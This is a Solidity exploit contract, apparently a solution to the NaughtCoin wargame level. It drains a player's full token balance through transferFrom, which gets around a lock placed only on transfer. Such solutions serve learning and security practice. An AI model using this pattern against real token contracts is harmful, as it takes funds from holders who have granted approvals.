// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
    function balanceOf(address) external returns (uint256);

    function transferFrom(
        address,
        address,
        uint256
    ) external returns (bool);
}

contract NaughtCoinAttack {
    INaughtCoin public naughtCoin;

    constructor(address _targetAddress) {
        naughtCoin = INaughtCoin(_targetAddress);
    }

    function attack(address _player) public {
        uint256 balance = naughtCoin.balanceOf(_player);

        naughtCoin.transferFrom(_player, address(this), balance);
    }

    receive() external payable {}
}
